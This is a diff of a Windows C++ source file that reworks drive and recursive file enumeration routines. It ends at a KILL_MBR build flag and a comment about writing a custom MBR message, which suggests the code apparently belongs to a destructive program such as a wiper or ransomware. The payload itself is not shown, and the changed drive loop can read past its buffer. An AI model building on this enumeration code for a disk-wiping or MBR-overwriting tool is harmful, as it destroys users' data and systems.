@@ -31,16 +31,16 @@ BOOL fnCopyFileW(
 	return FALSE;
 }
 
-// TODO: Fix uninitialized or just change to _Inout_ instead
 BOOL fnDriveEnumeratorW(
 	_Inout_ std::vector<std::wstring>* vszDrives
 ) {
 	WCHAR szDrives[nDRIVES];
 	std::wstring szDrive;
 	if (GetLogicalDriveStrings(nDRIVES, szDrives)) {
-		for (INT i = 0; i < (nDRIVES - 1); i += 4) {
+		for (INT i = 0; i < nDRIVES; i += 4) {
 			if (szDrives[i] != L'\0') {
-				szDrive = std::wstring{ szDrives[i], szDrives[i + 1], szDrives[i + 2] };
+				szDrive = { szDrives[i], szDrives[i + 1], szDrives[i + 2] };
+
 				UINT uDt = GetDriveType(szDrive.c_str());
 				if (uDt) {
 					if (uDt != DRIVE_NO_ROOT_DIR && uDt != DRIVE_CDROM) {
@@ -61,33 +61,69 @@ BOOL fnDriveEnumeratorW(
 
 // TODO: Use Pointers
 BOOL fnDirectoryIteratorW(
-	_In_    std::wstring               szDir,
-	_In_    std::wstring               szMask,
+	_In_    LPCWSTR                    szDir,
+	_In_    LPCWSTR                    szMask,
 	_Inout_ std::vector<std::wstring>* vszDir,
 	_Inout_ std::vector<std::wstring>* vszFile
 ) {
 	WIN32_FIND_DATA w32Fd;
-	std::wstring szW32fd = szDir + L"\\" + szMask;
-
+	std::wstring szW32fd = ((std::wstring)szDir + L"\\" + (std::wstring)szMask);
 	HANDLE hFind = FindFirstFile(szW32fd.c_str(), &w32Fd);
 	if (hFind != INVALID_HANDLE_VALUE) {
 		do {
 			if (w32Fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
 				if (wcscmp(w32Fd.cFileName, L".") != 0 && wcscmp(w32Fd.cFileName, L"..") != 0) {
-					vszDir->push_back(szDir + L"\\" + w32Fd.cFileName);
+					vszDir->push_back((std::wstring)szDir + L"\\" + w32Fd.cFileName);
 				}
 			} else {
-				vszFile->push_back(szDir + L"\\" + w32Fd.cFileName);
+				vszFile->push_back((std::wstring)szDir + L"\\" + w32Fd.cFileName);
 			}
 		} while (FindNextFile(hFind, &w32Fd));
 
 		FindClose(hFind);
 		return TRUE;
 	} else {
-		fnERRORHANDLERW(L"Couldn't open Handle \"hFind\" to FirstFile", NULL, L"FindFirstFileW", MB_ICONERROR);
+		fnERRORHANDLERW(L"Couldn't open Handle \"hFind\" to FirstFile\nFile: %s", NULL, L"FindFirstFileW", MB_ICONERROR, szW32fd.c_str());
 		return FALSE;
 	}
 }
+
+// Failed Attempt Backup
+//BOOL fnDirectoryIteratorW(
+//	_In_    LPCWSTR               szDir,
+//	_In_    LPCWSTR               szMask,
+//	_Inout_ std::vector<LPCWSTR>* vszDir,
+//	_Inout_ std::vector<LPCWSTR>* vszFile
+//) {
+//	WIN32_FIND_DATA w32Fd;
+//	std::wstring szW32fd = ((std::wstring)szDir + L"\\" + (std::wstring)szMask);
+//	HANDLE hFind = FindFirstFile(szW32fd.c_str(), &w32Fd);
+//	if (hFind != INVALID_HANDLE_VALUE) {
+//		do {
+//			LPCWSTR lpFound = new WCHAR[MAX_PATH]{ *(((std::wstring)szDir + L"\\" + w32Fd.cFileName).c_str()) };
+//
+//			if (w32Fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+//				if (wcscmp(w32Fd.cFileName, L".") != 0 && wcscmp(w32Fd.cFileName, L"..") != 0) {
+//					//					LPCWSTR lpDir = new WCHAR[MAX_PATH]{ *(((std::wstring)szDir + L"\\" + w32Fd.cFileName).c_str()) };
+//					//					LPCWSTR lpDir = new WCHAR[MAX_PATH];
+//					//					((std::wstring)szDir + L"\\" + w32Fd.cFileName)._Copy_s((LPWSTR)lpDir, MAX_PATH, MAX_PATH);
+//					vszDir->push_back(lpFound);
+//				}
+//			} else {
+//				//				LPCWSTR lpFile = new WCHAR[MAX_PATH];
+//				//				((std::wstring)szDir + L"\\" + w32Fd.cFileName)._Copy_s((LPWSTR)lpFile, MAX_PATH, MAX_PATH);
+//				vszFile->push_back(lpFound);
+//			}
+//		} while (FindNextFile(hFind, &w32Fd));
+//
+//		FindClose(hFind);
+//		return TRUE;
+//	}
+//	else {
+//		fnERRORHANDLERW(L"Couldn't open Handle \"hFind\" to FirstFile\nFile: %s", NULL, L"FindFirstFileW", MB_ICONERROR, szW32fd.c_str());
+//		return FALSE;
+//	}
+//}
 
 #if KILL_MBR == TRUE
 // at somepoint I might implement a custom MBR displaying a message
